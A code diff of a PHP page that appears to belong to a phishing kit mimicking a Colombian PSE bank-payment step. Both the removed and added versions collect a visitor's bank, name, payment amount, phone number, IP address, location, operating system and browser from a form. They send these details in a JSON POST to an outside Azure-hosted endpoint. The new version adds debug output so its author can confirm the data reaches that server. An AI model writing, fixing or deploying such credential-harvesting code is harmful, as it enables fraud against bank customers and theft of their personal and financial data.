@@ -1,39 +1,106 @@
-<?php $numero = $_POST['Inputphone'];
-$cuanto = $_POST['Inputcuanto'];
-$persona = $_POST['Inputpersona'];
-$entidad = $_POST['Inputbanc'];
-ini_set('display_errors', 0);
+<?php
+// ===== DEBUG DURO Y PAREJO (quitar en producción) =====
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ini_set('log_errors', 1);
+ini_set('error_log', __DIR__ . '/php-error.log');
 
-include('funciones.php');
-if ($entidad == 'DAVIVIENDA') {
-} else {
-    if (isset($_POST['Inputcuanto']) && isset($_POST['Inputpersona']) && isset($_POST['Inputbanc'])) {
-        $message = 'PSE
-Banco: ' . $_POST['Inputbanc'] . '
-Persona: ' . $_POST['Inputpersona'] . '
-Monto: ' . $_POST['Inputcuanto'] . '
-Numero: ' . $_POST['Inputphone'] . '
-Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
-Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
-SO: ' . $user_os . '
-Navegador: ' . $navegador . '';
+// Verifica requisitos para file_get_contents HTTPS
+$debug = [
+    'php_version'         => PHP_VERSION,
+    'allow_url_fopen'     => ini_get('allow_url_fopen'),
+    'openssl_loaded'      => extension_loaded('openssl'),
+    'default_socket_timeout' => ini_get('default_socket_timeout'),
+];
 
-        $payload = ['mensaje' => $message];
-        $url = "https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/";
+// Captura POST
+$numero  = $_POST['Inputphone']  ?? null;
+$cuanto  = $_POST['Inputcuanto'] ?? null;
+$persona = $_POST['Inputpersona']?? null;
+$entidad = $_POST['Inputbanc']   ?? null;
 
-        $options = [
-            "http" => [
-                "header"  => "Content-Type: application/json\r\nAccept: application/json\r\n",
-                "method"  => "POST",
-                "content" => json_encode($payload, JSON_UNESCAPED_UNICODE),
-                "timeout" => 20
-            ]
-        ];
+// Evita notice si no definiste estas vars en funciones.php
+$myip      = $myip      ?? 'N/A';
+$pais      = $pais      ?? 'N/A';
+$region    = $region    ?? 'N/A';
+$user_os   = $user_os   ?? 'N/A';
+$navegador = $navegador ?? 'N/A';
 
-        $context  = stream_context_create($options);
-        $response = file_get_contents($url, false, $context);
+include('funciones.php'); // si aquí hay errores, se verán arriba
+
+if ($entidad !== 'DAVIVIENDA') {
+  if ($cuanto && $persona && $entidad) {
+
+    $message =
+"PSE
+Banco: {$entidad}
+Persona: {$persona}
+Monto: {$cuanto}
+Numero: {$numero}
+Fecha: " . date('l jS \of F Y h:i:s A') . "
+Ip y Localidad: {$myip} {$pais} {$region}
+SO: {$user_os}
+Navegador: {$navegador}";
+
+    $payload = ['mensaje' => $message];
+    $json    = json_encode($payload, JSON_UNESCAPED_UNICODE);
+
+    // Chequea errores de JSON
+    if ($json === false) {
+        $debug['json_error'] = json_last_error_msg();
     }
+
+    $url = "https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/";
+
+    // IMPORTANTÍSIMO: ignore_errors => true para poder leer body en 4xx/5xx
+    $options = [
+      "http" => [
+        "header"        => "Content-Type: application/json\r\nAccept: application/json\r\n",
+        "method"        => "POST",
+        "content"       => $json,
+        "timeout"       => 20,
+        "ignore_errors" => true,
+      ]
+    ];
+
+    $context  = stream_context_create($options);
+    $response = @file_get_contents($url, false, $context); // @ para capturar con error_get_last
+
+    // Status y headers
+    $status_line = $http_response_header[0] ?? 'NO_STATUS_LINE';
+    $headers     = $http_response_header ?? [];
+
+    if ($response === false) {
+        $php_last_error = error_get_last();
+    }
+
+    // ===== Salida de diagnóstico =====
+    header('Content-Type: text/plain; charset=utf-8');
+    echo "=== DEBUG AZURE PHP ===\n";
+    foreach ($debug as $k=>$v) echo "$k: $v\n";
+    echo "\n=== REQUEST ===\n";
+    echo "URL: $url\n";
+    echo "Payload JSON:\n$json\n";
+    echo "\n=== RESPONSE HEADERS ===\n";
+    echo $status_line . "\n";
+    foreach ($headers as $h) echo $h . "\n";
+    echo "\n=== RESPONSE BODY ===\n";
+    echo (string)$response . "\n";
+
+    if (!empty($php_last_error)) {
+        echo "\n=== PHP LAST ERROR ===\n";
+        print_r($php_last_error);
+    }
+
+    exit; // evita seguir renderizando otra cosa
+  } else {
+    header('Content-Type: text/plain; charset=utf-8');
+    echo "Faltan campos POST: Inputcuanto, Inputpersona o Inputbanc.\n";
+    var_export(['Inputphone'=>$numero,'Inputcuanto'=>$cuanto,'Inputpersona'=>$persona,'Inputbanc'=>$entidad]);
+    exit;
+  }
 }
+
 ?>
 
 <html class="no-js">
